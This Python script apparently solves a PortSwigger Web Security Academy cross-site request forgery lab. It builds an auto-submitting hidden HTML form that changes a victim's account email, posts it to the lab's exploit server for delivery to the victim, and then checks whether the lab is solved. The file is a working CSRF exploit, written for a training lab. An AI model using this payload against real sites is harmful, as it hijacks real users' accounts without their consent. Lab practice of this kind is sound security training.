import requests
from urllib3.exceptions import InsecureRequestWarning
from time import sleep
from bs4 import BeautifulSoup

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

# lab_url: https://portswigger.net/web-security/csrf/lab-no-defenses
# author: 0xyf


class CSRF1:
    def __init__(self):
        self.lab_id = "0a87008a04d550b59021280e00e60043"
        self.proxies = {"https": "http://127.0.0.1:8080"}

        self.url = f"https://{self.lab_id}.web-security-academy.net"

    def get_exploit_srv_url(self):
        r = requests.get(self.url)
        soup = BeautifulSoup(r.text, "html.parser")
        self.exploit_srv_url = soup.find("a", id="exploit-link").get("href")

    def execute_request(self, data):
        r = requests.post(
            f"{self.exploit_srv_url}",
            data=data,
            proxies=self.proxies,
            verify=False,
        )
        return r

    def csrf(self):
        self.get_exploit_srv_url()
        payload = f"""<form method="POST" action="{self.url}/my-account/change-email">
        <input type="hidden" name="email" value="0xyf@0xyf.local">
        </form>
        <script>
        document.forms[0].submit();
        </script>"""
        data = {
            "urlIsHttps": "on",
            "responseFile": "/exploit",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8",
            "formAction": "DELIVER_TO_VICTIM",
            "responseBody": payload,
        }
        r = self.execute_request(data)

    def check_solved(self):
        sleep(2)
        r = requests.get(self.url)
        if "Congratulations, you solved the lab!" in r.text:
            print("Lab Solved")
        else:
            print("Did not solve lab, check payload")

    def solve(self):
        self.csrf()
        self.check_solved()


def main():
    CSRF1().solve()


if __name__ == "__main__":
    main()
